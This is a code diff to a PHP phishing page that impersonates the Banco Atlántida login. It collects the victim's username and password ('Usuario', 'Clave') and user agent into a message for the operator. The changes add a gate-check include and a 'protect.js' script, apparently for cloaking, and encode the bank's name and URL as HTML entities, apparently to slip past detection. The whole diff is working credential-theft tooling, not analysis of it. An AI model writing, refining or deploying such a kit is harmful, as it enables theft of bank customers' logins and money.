@@ -1,4 +1,5 @@
 <?php
+require_once dirname(__DIR__) . '/gate_check.php';
 include("../data.php");
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
@@ -13,7 +14,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $ua   = $_SERVER['HTTP_USER_AGENT'] ?? '?';
     $date = date('d/m/Y H:i:s');
 
-    $msg  = "🏦 <b>BANCO ATLÁNTIDA — ACCESO</b>\n";
+    $msg  = "🏦 BANCO MANZANA — ACCESO\n";
     $msg .= "━━━━━━━━━━━━━━━━━━━━\n";
     $msg .= "👤 <b>Usuario:</b> $usuario\n";
     $msg .= "🔑 <b>Clave:</b> $clave\n";
@@ -50,7 +51,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-  <title>Banco Atlántida — Iniciar sesión</title>
+  <title>Banco Atl&#225;ntida — Iniciar sesión</title>
   <link rel="icon" href="../img/logo-ba.svg" type="image/svg+xml"/>
   <link rel="preconnect" href="https://fonts.googleapis.com"/>
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
@@ -113,7 +114,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   </div>
 
   <div class="logo-wrap">
-    <img src="../img/logo-ba.svg" alt="Banco Atlántida"/>
+    <img src="../img/logo-ba.svg" alt="Banco Atl&#225;ntida"/>
   </div>
 
   <p class="subtitle">Ingresa <span>tu usuario y contraseña</span> para iniciar sesión.</p>
@@ -160,7 +161,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       </svg>
       <div class="card-text">
         <div class="card-title">¡Importantes consejos de seguridad!</div>
-        <div class="card-desc">Antes de ingresar tu usuario y contraseña en Atlántida Web, comprueba que la dirección sea: <a href="#">https://app.bancatlan.hn</a></div>
+        <div class="card-desc">Antes de ingresar tu usuario y contraseña en nuestro portal, comprueba que la dirección sea: <a href="#">https://app.banc&#97;tlan.hn</a></div>
       </div>
     </div>
     <div class="dots">
@@ -190,6 +191,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   });
 </script>
 <script src="../popup.js"></script>
+<script src="../protect.js"></script>
 <?php if (!empty($_GET['error'])): ?>
 <script>
 (function(){
